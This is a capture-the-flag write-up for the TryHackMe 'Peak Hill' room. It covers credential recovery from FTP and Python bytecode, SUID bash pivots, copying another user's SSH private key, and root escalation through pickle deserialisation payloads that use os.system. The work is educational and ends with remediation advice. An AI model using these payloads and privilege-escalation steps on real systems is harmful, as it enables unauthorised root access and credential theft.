# Peak Hill

Exercises in Python library abuse and some exploitation techniques

Room: [https://tryhackme.com/room/peakhill](https://tryhackme.com/room/peakhill)

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/peakhill.md

---

## Overview

Peak Hill focused on Python object serialisation/deserialisation abuse and Python bytecode analysis.

The attack path was:

1. Enumerate exposed services.
2. Use anonymous FTP to retrieve encoded credential data.
3. Decode the credential blob and recover SSH credentials.
4. SSH in as the first user.
5. Reverse engineer a Python bytecode file.
6. Recover credentials for a custom TCP command service.
7. Use the command service to execute commands as the second user.
8. Create a temporary SUID helper to pivot from the SSH session into the second user.
9. Retrieve the second user’s SSH private key.
10. SSH in properly as the second user.
11. Abuse a `sudo`-allowed binary that unsafely deserialises Base64-encoded pickle data.
12. Create a root-owned SUID shell.
13. Read the root flag, handling a deliberately awkward filename.

All flags, passwords, private keys, and direct challenge answers have been intentionally obfuscated.

---

## Port Scanning

Run a full TCP port scan with default scripts and service-version detection:

```
sudo nmap -sV -sC -p- --min-rate 5000 \
  -oN nmap-sv-all.txt \
  10.64.176.191
```

The scan identified:

```
20/tcp    closed  ftp-data
21/tcp    open    ftp
22/tcp    open    ssh
7321/tcp  open    unknown custom service
```

The FTP service allowed anonymous login and exposed a small file.

Port `7321` responded with a simple login prompt:

```
Username:
Password:
```

This suggested a custom TCP application rather than a standard service.

---

## FTP Enumeration

Connect to FTP:

```
ftp 10.64.176.191
```

Log in anonymously:

```
Username: anonymous
Password: anonymous
```

List files:

```
ls
```

The FTP share contained:

```
test.txt
.creds
```

Download the files:

```
get test.txt
get .creds
```

The `.creds` file contained a long binary-looking string made up of `0` and `1` characters.

---

## Decoding the FTP Credential Blob

The `.creds` data looked like binary text. Converting it from binary to bytes showed that it was not plain text credentials, but a Python pickle-style structure.

A simple way to start inspecting it is:

```
python3 - <<'PY'
data = open(".creds").read().strip()
raw = int(data, 2).to_bytes(len(data) // 8, "big")
print(raw[:100])
print(raw)
PY
```

The decoded data contained shuffled key/value-style entries, including names similar to:

```
ssh_user0
ssh_user1
ssh_user2
ssh_pass0
ssh_pass1
ssh_pass2
```

The important idea was to rebuild the username and password by sorting the fragments by their numeric suffix.

After reconstructing the values, SSH credentials were recovered:

```
Username: [REDACTED_SSH_USER]
Password: [REDACTED_SSH_PASSWORD]
```

---

## Initial SSH Access

Use the recovered SSH credentials:

```
ssh [REDACTED_SSH_USER]@10.64.176.191
```

Confirm the user:

```
id
whoami
```

The first user’s home directory contained a compiled Python file:

```
cmd_service.pyc
```

---

## Inspecting the Python Bytecode File

Check the file type:

```
file cmd_service.pyc
```

The output was unusual:

```
cmd_service.pyc: data
```

Inspect the header manually:

```
xxd -l 32 cmd_service.pyc
```

The file started with:

```
55 0d 0d 0a
```

This magic value indicated a Python `.pyc` file, even though `file` did not recognise it.

The Python code object began at offset `16`, so it could be loaded with `marshal`.

Dump the top-level code object and nested constants:

```
python3 - <<'PY'
import marshal, types

data = open("cmd_service.pyc", "rb").read()
code = marshal.loads(data[16:])

def walk(code, depth=0):
    pad = "  " * depth
    print(f"\n{pad}[CODE] {code.co_name}")
    print(f"{pad}Names: {code.co_names}")
    print(f"{pad}Vars:  {code.co_varnames}")
    print(f"{pad}Consts:")
    for i, c in enumerate(code.co_consts):
        print(f"{pad}  {i}: {repr(c)}")
    for c in code.co_consts:
        if isinstance(c, types.CodeType):
            walk(c, depth + 1)

walk(code)
PY
```

This revealed useful function names and strings:

```
ask_creds
Username:
Password:
Wrong credentials!
Successfully logged in!
Cmd:
subprocess
Popen
shell
```

The service accepted a username and password, then executed commands using `subprocess.Popen(..., shell=True)`.

The top-level constants also included two large integers that were converted using:

```
long_to_bytes
```

Decode those integer constants:

```
python3 - <<'PY'
def long_to_bytes(n):
    out = bytearray()
    while n:
        out.append(n & 0xff)
        n >>= 8
    print(bytes(reversed(out)).decode())

long_to_bytes([REDACTED_USERNAME_INTEGER])
long_to_bytes([REDACTED_PASSWORD_INTEGER])
PY
```

This recovered credentials for the custom service:

```
Username: [REDACTED_SERVICE_USER]
Password: [REDACTED_SERVICE_PASSWORD]
```

---

## Accessing the Custom Command Service

Connect to port `7321`:

```
nc 10.64.176.191 7321
```

Log in with the recovered service credentials:

```
Username: [REDACTED_SERVICE_USER]
Password: [REDACTED_SERVICE_PASSWORD]
```

Successful login returned:

```
Successfully logged in!
Cmd:
```

Confirm command execution:

```
whoami
id
```

The service executed commands as the second user.

A small catch was that each command ran in a new subprocess. This meant commands like `cd ~` did not persist between prompts.

Use absolute paths or chain commands in one line:

```
cd /home/[REDACTED_SERVICE_USER] && ls -la
```

Read the user flag:

```
cat /home/[REDACTED_SERVICE_USER]/user.txt
```

Output:

```
[REDACTED_USER_FLAG]
```

The real flag has been intentionally omitted.

---

## Pivoting Into the Second User

The command service ran as the second user, but it was awkward to use interactively.

To pivot from the normal SSH session into the second user, create a SUID copy of Bash from the command service:

```
cp /bin/bash /tmp/userbash && chmod 4755 /tmp/userbash && ls -la /tmp/userbash
```

The file should be owned by the second user and have the SUID bit set:

```
-rwsr-xr-x 1 [REDACTED_SERVICE_USER] [REDACTED_SERVICE_USER] ... /tmp/userbash
```

From the SSH session as the first user, execute:

```
/tmp/userbash -p
```

Confirm the effective user:

```
id
```

The `-p` option is important because Bash otherwise drops elevated privileges in many cases.

---

## Recovering the Second User’s SSH Key

From the SUID shell, inspect the second user’s SSH directory:

```
cd /home/[REDACTED_SERVICE_USER]/.ssh
ls -la
```

The directory contained:

```
authorized_keys
id_rsa
id_rsa.pub
```

Copy the private key somewhere the first SSH user can read:

```
cp /home/[REDACTED_SERVICE_USER]/.ssh/id_rsa /tmp/service_user_id_rsa
chmod 644 /tmp/service_user_id_rsa
```

From the AttackBox, download the key:

```
scp [REDACTED_FIRST_USER]@10.64.176.191:/tmp/service_user_id_rsa ./service_user_id_rsa
```

Fix permissions locally:

```
chmod 600 service_user_id_rsa
```

SSH in properly as the second user:

```
ssh -i service_user_id_rsa [REDACTED_SERVICE_USER]@10.64.176.191
```

Confirm access:

```
id
whoami
```

---

## Sudo Enumeration

Check sudo permissions:

```
sudo -l
```

The second user was allowed to run the following binary as root without a password:

```
(ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
```

Run the binary:

```
sudo /opt/peak_hill_farm/peak_hill_farm
```

It displayed:

```
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow:
```

Testing normal input failed:

```
to grow: peas
this not grow did not grow on the Peak Hill Farm! :(
```

Testing command injection also failed, but certain inputs returned:

```
failed to decode base64
```

This revealed that the binary expected Base64-encoded input.

---

## Confirming Base64 Handling

Encode a harmless string:

```
echo -n 'carrot' | base64
```

Submit the output:

```
sudo /opt/peak_hill_farm/peak_hill_farm
```

At the prompt:

```
to grow: Y2Fycm90
```

The binary decoded the input but did not treat it as valid data:

```
this not grow did not grow on the Peak Hill Farm! :(
```

Given the room’s theme and the earlier Python abuse, this strongly suggested unsafe Python pickle deserialisation after Base64 decoding.

---

## Confirming Pickle Deserialisation RCE

Generate a Base64-encoded pickle payload that runs `id`:

```
python3 - <<'PY'
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
PY
```

Submit the generated payload to the sudo binary:

```
sudo /opt/peak_hill_farm/peak_hill_farm
```

At the prompt:

```
to grow: [BASE64_PICKLE_PAYLOAD]
```

The binary executed the command as root:

```
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed unsafe deserialisation of attacker-controlled pickle data.

---

## Creating a Root SUID Shell

Generate a pickle payload that creates a root-owned SUID Bash:

```
python3 - <<'PY'
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash",))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
PY
```

Submit the generated payload:

```
sudo /opt/peak_hill_farm/peak_hill_farm
```

At the prompt:

```
to grow: [BASE64_PICKLE_PAYLOAD]
```

Confirm the file exists and has the SUID bit:

```
ls -la /tmp/rootbash
```

Expected permissions:

```
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

Run it with preserved privileges:

```
/tmp/rootbash -p
```

Confirm root effective UID:

```
id
```

Output should show:

```
euid=0(root)
```

---

## Reading the Root Flag

Attempting to read `/root/root.txt` directly failed because the file name contained unusual whitespace or hidden characters:

```
cat /root/root.txt
cat: /root/root.txt: No such file or directory
```

List `/root`:

```
cd /root
ls
```

The displayed filename looked like `root.txt`, but it was not a normal filename.

Use a glob instead:

```
cat /root/*root.txt*
```

Output:

```
[REDACTED_ROOT_FLAG]
```

The real flag has been intentionally omitted.

---

## Attack Summary

The complete attack path was:

```
Full TCP port scan
        ↓
Anonymous FTP login
        ↓
Binary-looking .creds file
        ↓
Decode binary to Python pickle-style data
        ↓
Rebuild shuffled SSH credential fragments
        ↓
SSH as first user
        ↓
Find cmd_service.pyc
        ↓
Parse Python bytecode with marshal
        ↓
Decode integer constants with long_to_bytes
        ↓
Recover custom service credentials
        ↓
Log in to port 7321
        ↓
Command execution as second user
        ↓
Create SUID Bash owned by second user
        ↓
Pivot into second user from SSH session
        ↓
Recover second user SSH private key
        ↓
SSH as second user
        ↓
sudo -l reveals root-executable farm binary
        ↓
Binary expects Base64 input
        ↓
Unsafe pickle deserialisation
        ↓
Root command execution
        ↓
Create root-owned SUID Bash
        ↓
Read root flag using wildcard for strange filename
```

---

## Key Commands

### Full port scan

```
sudo nmap -sV -sC -p- --min-rate 5000 \
  -oN nmap-sv-all.txt \
  10.64.176.191
```

### FTP login

```
ftp 10.64.176.191
```

### Decode binary text to bytes

```
python3 - <<'PY'
data = open(".creds").read().strip()
raw = int(data, 2).to_bytes(len(data) // 8, "big")
print(raw)
PY
```

### SSH as first user

```
ssh [REDACTED_FIRST_USER]@10.64.176.191
```

### Inspect `.pyc` header

```
xxd -l 32 cmd_service.pyc
```

### Walk Python code constants

```
python3 - <<'PY'
import marshal, types

data = open("cmd_service.pyc", "rb").read()
code = marshal.loads(data[16:])

def walk(code, depth=0):
    pad = "  " * depth
    print(f"\n{pad}[CODE] {code.co_name}")
    print(f"{pad}Names: {code.co_names}")
    print(f"{pad}Vars:  {code.co_varnames}")
    print(f"{pad}Consts:")
    for i, c in enumerate(code.co_consts):
        print(f"{pad}  {i}: {repr(c)}")
    for c in code.co_consts:
        if isinstance(c, types.CodeType):
            walk(c, depth + 1)

walk(code)
PY
```

### Decode long integers to strings

```
python3 - <<'PY'
def long_to_bytes(n):
    out = bytearray()
    while n:
        out.append(n & 0xff)
        n >>= 8
    print(bytes(reversed(out)).decode())

long_to_bytes([INTEGER])
PY
```

### Connect to the command service

```
nc 10.64.176.191 7321
```

### Create SUID helper as second user

```
cp /bin/bash /tmp/userbash && chmod 4755 /tmp/userbash
```

### Use SUID helper from first user SSH

```
/tmp/userbash -p
```

### Copy second user SSH key to readable path

```
cp /home/[REDACTED_SERVICE_USER]/.ssh/id_rsa /tmp/service_user_id_rsa
chmod 644 /tmp/service_user_id_rsa
```

### Download second user SSH key

```
scp [REDACTED_FIRST_USER]@10.64.176.191:/tmp/service_user_id_rsa ./service_user_id_rsa
chmod 600 service_user_id_rsa
```

### SSH as second user

```
ssh -i service_user_id_rsa [REDACTED_SERVICE_USER]@10.64.176.191
```

### Check sudo

```
sudo -l
```

### Run the farm binary

```
sudo /opt/peak_hill_farm/peak_hill_farm
```

### Generate test pickle payload

```
python3 - <<'PY'
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
PY
```

### Generate root SUID Bash payload

```
python3 - <<'PY'
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash",))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
PY
```

### Use root SUID Bash

```
/tmp/rootbash -p
```

### Read oddly named root flag file

```
cat /root/*root.txt*
```

---

## Remediation

The identified weaknesses could be remediated by:peakhill

1. Never storing credentials in reversible or weakly obfuscated client-accessible files.
2. Avoiding Python pickle for untrusted data.
3. Replacing `pickle.loads()` with safe formats such as JSON where possible.
4. If serialisation is required, enforcing cryptographic signing and strict type validation.
5. Avoiding `subprocess.Popen(..., shell=True)` for user-controlled input.
6. Running custom command services with least privilege and strong authentication.
7. Removing sensitive private keys from user home directories where not required.
8. Restricting `sudo` rules to safe commands only.
9. Avoiding `NOPASSWD` access to custom binaries that parse user input.
10. Ensuring privileged binaries validate and sanitise all input.
11. Avoiding SUID shell creation and monitoring temporary directories for suspicious SUID files.
12. Using standard filenames for sensitive files and relying on permissions rather than filename tricks.
13. Keeping systems updated, as the host was running an older Ubuntu release.

---

## Notes

This room was a good example of how Python convenience features can become dangerous when exposed to attacker-controlled input.

The key learning points were:

* Pickle is code execution, not just data loading.
* `.pyc` files can be inspected even without source code.
* Python bytecode constants often leak application secrets.
* `subprocess` with `shell=True` can turn a custom service into a command runner.
* `sudo` rules around custom binaries need careful review.
* Weird filenames can trip up direct paths, but globbing or inode-safe methods can still access them.

[1]: https://github.com/garthheff/CTF-Writeups/tree/main/TryHackMe "CTF-Writeups/TryHackMe at main · garthheff/CTF-Writeups · GitHub"
